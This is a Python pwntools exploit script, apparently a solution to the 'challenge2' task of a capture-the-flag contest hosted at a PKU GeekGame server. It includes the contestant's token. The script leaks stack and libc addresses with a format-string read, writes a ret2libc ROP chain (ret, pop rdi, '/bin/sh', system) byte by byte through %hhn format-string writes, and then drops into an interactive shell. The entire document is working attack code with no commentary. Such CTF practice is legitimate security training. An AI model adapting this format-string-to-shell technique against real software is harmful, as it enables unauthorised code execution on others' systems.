from pwn import *

is_remote = True
if is_remote:
    ip = "prob11.geekgame.pku.edu.cn"
    port = 10011
    token = b"9:How do you know my uid is 9"
    p = remote(ip, port)
    p.sendline(token)
else:
    p = process('./challenge2')

p.recv()
sleep(.05)

elf = ELF('./challenge2')
libc = ELF('./libc.so.6')
main = elf.symbols['main']
_start = elf.symbols['_start']

system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh'))
pop_rdi = 0x2a3e5
ret     = 0x2a3e6

def inject_start(payload1, payload2, payload3=b"bye", return_pos = main + 0x6, return_to_main=False, first_time=False):
    print(payload1, payload2, payload3)
    p.sendline(payload1)
    sleep(.05)
    p.sendline(payload2)
    sleep(.05)
    padding = 0x38
    if return_to_main:
        assert len(payload3) <= padding
        payload3 = payload3 + b"A" * (padding - len(payload3))
        payload3 = payload3 + p64(return_pos)
    p.sendline(payload3)
    sleep(.05)
    res = p.recvuntil(b'luck~:)')
    print(res)
    return res

recv = inject_start(b"%20$p,%41$p",b"Hello", return_to_main=True, first_time=True)
result = re.search(b"0x([0-9a-f]+),0x([0-9a-f]+)", recv)
rsp, libc_start_main = result.group(1),result.group(2)
rsp = int(rsp, 16) - 392

print(hex(rsp))

libc_start_main = int(libc_start_main, 16) - 128

libc_base = libc_start_main - libc.symbols['__libc_start_main']

system_addr = libc_base + system
binsh_addr = libc_base + binsh
pop_rdi_addr = libc_base + pop_rdi
ret_addr = libc_base + ret

print(hex(system_addr), hex(binsh_addr), hex(pop_rdi_addr))

writing_bytes = (
    [(ret_addr     >> (8 * i)) & 255 for i in range(8)] +
    [(pop_rdi_addr >> (8 * i)) & 255 for i in range(8)] +
    [(binsh_addr   >> (8 * i)) & 255 for i in range(8)] +
    [(system_addr  >> (8 * i)) & 255 for i in range(8)]
)


start_pos = rsp + 0x288
for i, byte in enumerate(writing_bytes):
    if (byte == 0):
        f = f'%14$hhn'
    else:
        f = f'%{byte}c%14$hhn'
    inject_start(p64(start_pos + i), f.encode(), return_to_main=True)
    print(f"number: {i}")


inject_start(b"hello", b"hello")

p.interactive()
